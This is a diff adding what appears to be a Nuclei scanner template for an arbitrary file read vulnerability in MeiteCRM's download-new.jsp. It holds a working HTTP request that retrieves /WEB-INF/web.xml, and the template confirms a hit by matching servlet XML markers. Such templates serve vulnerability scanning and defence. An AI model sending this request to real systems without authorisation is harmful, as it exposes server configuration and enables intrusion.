@@ -1,0 +1,27 @@
+id: meiteCRM-download-new_jsp-File-reading
+
+info:
+  name: 美特CRM download-new.jsp 任意文件读取漏洞
+  author: meiteCRM
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<web-app'
+          - '</web-app>'
+          - '<servlet>'
+          - '</servlet>'
+        condition: and
+      - type: status
+        status: 
+          - 200
